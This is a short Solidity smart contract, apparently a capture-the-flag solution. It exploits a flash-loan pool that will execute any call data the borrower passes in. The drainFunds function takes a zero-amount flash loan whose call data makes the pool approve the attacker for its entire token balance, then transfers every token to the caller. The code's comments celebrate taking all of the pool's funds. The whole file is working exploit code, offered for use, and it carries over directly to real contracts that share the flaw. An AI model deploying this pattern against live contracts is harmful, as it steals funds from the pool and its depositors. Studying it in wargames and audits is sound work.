// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttack {
    address immutable public pool;
    IERC20 immutable public currency;
    constructor(address _pool, IERC20 _currency) {
        pool = _pool;
        currency = _currency;
    }

    function drainFunds() external {
        // Flashloan allows you to pass in arbitrary function call data so lets make it approve this contract to take
        // all of its funds :D.
        uint256 poolBalance = currency.balanceOf(address(pool));

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );

        (bool success, ) = pool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                msg.sender,
                currency,
                data
            )
        );
        require(success);

        // Pull all funds from pool to caller.
        currency.transferFrom(address(pool), msg.sender, poolBalance);
    }
}
